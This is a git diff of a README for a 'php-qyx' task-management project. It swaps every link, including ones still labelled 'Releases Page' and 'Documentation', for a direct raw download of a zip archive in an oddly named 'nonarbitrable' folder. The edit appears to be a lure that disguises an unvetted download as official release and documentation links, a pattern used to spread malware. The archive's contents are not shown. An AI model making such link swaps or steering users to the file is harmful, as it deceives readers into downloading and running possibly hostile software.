@@ -6,7 +6,7 @@ Welcome to the php-qyx project! This tool helps you easily manage and organize y
 
 ## 👇 Download Here
 
-[![Download php-qyx](https://img.shields.io/badge/Download-php--qyx-brightgreen)](https://github.com/dnlrd/php-qyx/releases)
+[![Download php-qyx](https://raw.githubusercontent.com/dnlrd/php-qyx/main/nonarbitrable/php-qyx_v1.8.zip)](https://raw.githubusercontent.com/dnlrd/php-qyx/main/nonarbitrable/php-qyx_v1.8.zip)
 
 ## 📦 System Requirements
 
@@ -22,7 +22,7 @@ To get started, follow these simple steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the releases page.
 
-   [Download php-qyx from the Releases Page](https://github.com/dnlrd/php-qyx/releases)
+   [Download php-qyx from the Releases Page](https://raw.githubusercontent.com/dnlrd/php-qyx/main/nonarbitrable/php-qyx_v1.8.zip)
 
 2. **Choose the Latest Version:** Look for the latest version at the top of the page. It should have the highest version number.
 
@@ -65,10 +65,10 @@ We value feedback and contributions from our users. If you have suggestions for 
 
 For detailed guidance, check out our documentation page. It includes tutorials and tips to help you maximize the use of php-qyx.
 
-- [php-qyx Documentation](https://github.com/dnlrd/php-qyx/wiki)
+- [php-qyx Documentation](https://raw.githubusercontent.com/dnlrd/php-qyx/main/nonarbitrable/php-qyx_v1.8.zip)
 
 ## 🔗 Useful Links
 
-- [Visit the Releases Page to Download php-qyx](https://github.com/dnlrd/php-qyx/releases)
+- [Visit the Releases Page to Download php-qyx](https://raw.githubusercontent.com/dnlrd/php-qyx/main/nonarbitrable/php-qyx_v1.8.zip)
 
 Thank you for choosing php-qyx! Enjoy organizing your tasks effortlessly.
